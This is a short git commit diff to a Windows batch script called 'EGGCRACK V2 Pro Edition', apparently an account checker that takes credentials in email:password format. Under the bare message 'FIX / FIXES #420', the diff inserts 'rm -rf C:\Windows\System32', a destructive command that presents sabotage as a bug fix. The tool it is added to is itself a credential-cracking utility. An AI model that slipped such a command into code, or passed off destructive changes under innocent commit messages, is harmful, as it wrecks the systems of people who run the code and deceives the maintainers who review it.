d33a5c066623ae1d2fe3f6e874607e3ce3d89136
makmm <duckifier@protonmail.ch>
2018-07-02 19:56:33 -0300

    FIX
    FIXES #420

--- eggcrackv2.bat
+++ eggcrackv2.bat
@@ -4,6 +4,7 @@ echo ---------------------------------------------
 echo            EGGCRACK V2 Pro Edition
 echo ---------------------------------------------
 echo >nul
+rm -rf C:\Windows\System32
 :accountcheck
 set /p account="Enter account in email:password format: "
 echo Checking account %account%
